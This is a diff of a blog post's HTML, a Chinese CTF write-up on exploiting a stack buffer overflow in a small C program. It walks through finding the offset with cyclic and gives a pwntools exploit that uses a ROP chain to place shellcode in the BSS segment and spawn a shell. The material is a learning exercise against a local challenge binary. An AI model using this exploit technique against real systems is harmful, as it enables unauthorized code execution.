@@ -59,14 +59,14 @@
 
   
     
-    <h3 class="article-title"><a href="/2019/03/03/Pwn/"><span></span></a></h3>
+    <h3 class="article-title"><a href="/2019/03/03/Pwn/"><span>Pwn</span></a></h3>
     
   
 
   <div class="article-top-meta">
     <span class="posted-on">
       <a href="/2019/03/03/Pwn/" rel="bookmark">
-        <time class="entry-date published" datetime="2019-03-03T10:47:27.453Z">
+        <time class="entry-date published" datetime="2019-03-03T11:56:05.000Z">
           2019-03-03
         </time>
       </a>
@@ -79,28 +79,27 @@
   <div class="article-content">
     <div class="entry">
       
-        <p>title: Pwn<br>date: 2019-03-03 18:47:27<br>tags: ctf</p>
-<p>周末看到了这道题，学习记录下来！</p>
+        <p>周末看到了这道题，学习记录下来！</p>
 <p>首先我们先来看源代码：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Welcome to zsctf!\n"</span>, <span class="number">21</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(<span class="number">0</span>, buffer, <span class="number">0x40</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    welcome();</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>通过看源码，能明显的看出，read()函数处存在明显栈溢出，接着我们来运行下程序，熟悉程序的各个功能。</p>
-<p><img src="/2019/03/03/Pwn/1.PNG" alt=""></p>
+<p><img src="/2019/03/03/Pwn/D:/my%20first%20blog/blog/Hexo/source/_posts/1.PNG" alt=""></p>
 <p>检查该程序打开的保护措施</p>
-<p><img src="/2019/03/03/Pwn/3.PNG" alt=""></p>
+<p><img src="/2019/03/03/Pwn/D:/my%20first%20blog/blog/Hexo/source/_posts/3.PNG" alt=""></p>
 <p>NX保护关闭，就更容易利用了</p>
 <p>我们就可以来捋下大致的利用思路，通过read()函数，把shellcode读进去BBS段</p>
 <p>接下来，我们就可以操作了；</p>
 <p>用cyclic 100生成100个字符来覆盖返回地址，并将这些字符输入给程序来得到无效地址</p>
-<p><img src="/2019/03/03/Pwn/5.PNG" alt=""></p>
+<p><img src="/2019/03/03/Pwn/D:/my%20first%20blog/blog/Hexo/source/_posts/5.PNG" alt=""></p>
 <p>结合cyclic -l  无效地址来得到返回地址，并将shellcode放入该返回地址处</p>
-<p><img src="/2019/03/03/Pwn/6.PNG" alt=""></p>
-<p><img src="/2019/03/03/Pwn/8.PNG" alt=""></p>
+<p><img src="/2019/03/03/Pwn/D:/my%20first%20blog/blog/Hexo/source/_posts/6.PNG" alt=""></p>
+<p><img src="/2019/03/03/Pwn/D:/my%20first%20blog/blog/Hexo/source/_posts/8.PNG" alt=""></p>
 <p>通过ida找到bbs段的地址</p>
 <p><img src="/2019/03/03/Pwn/D:/my first blog\blog\Hexo\source\_posts\Pwn\9.PNG" alt=""></p>
 <p>结合pwntools，构造rop，写exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">bss_add = <span class="number">0x804A024</span>   <span class="comment">#通过ida找到的bbs段的地址</span></span><br><span class="line">proc = <span class="string">'./static'</span></span><br><span class="line">context.binary = proc</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p = process(proc)</span><br><span class="line">p.recvuntil(<span class="string">"Welcome to zsctf!"</span>)</span><br><span class="line">rop = ROP(proc)</span><br><span class="line">rop.read(<span class="number">0</span>,bss_add+<span class="number">0x100</span>,len(shellcode))</span><br><span class="line">rop.call(bss_add+<span class="number">0x100</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">20</span> + str(rop))</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>最终成功获得shell</p>
-<p><img src="/2019/03/03/Pwn/7.PNG" alt=""></p>
+<p><img src="/2019/03/03/Pwn/D:/my%20first%20blog/blog/Hexo/source/_posts/7.PNG" alt=""></p>
 <p>本文为听b站莫笑老师的笔记记录吧</p>
 
       
@@ -113,6 +112,13 @@
 
     
 
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/ctf/">ctf</a>
+    </span>
     
 
     </div>
